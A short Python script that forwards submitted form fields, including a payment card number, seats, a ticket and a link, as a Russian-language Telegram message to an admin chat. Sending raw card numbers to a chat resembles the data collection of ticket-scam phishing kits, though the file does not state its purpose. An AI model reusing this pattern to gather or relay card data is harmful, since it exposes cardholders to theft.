import os
import telegram
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("ADMIN_CHAT_ID")

bot = telegram.Bot(token=BOT_TOKEN)

def handle_submission(data):
    msg = ""
    if 'action' in data:
        msg += f"🔧 Команда боту: {data['action']}\n"
    if 'question' in data:
        msg += f"❓ Вопрос от бота: {data['question']}\n"
    if 'link' in data:
        msg += f"🔗 Ссылка: {data['link']}\n"
    if 'card' in data:
        msg += f"💳 Номер карты: {data['card']}\n"
    if 'seat' in data:
        msg += f"🎟️ Места: {data['seat']}\n"
    if 'ticket' in data:
        msg += f"📎 Билет: {data['ticket']}\n"
    bot.send_message(chat_id=CHAT_ID, text=msg)
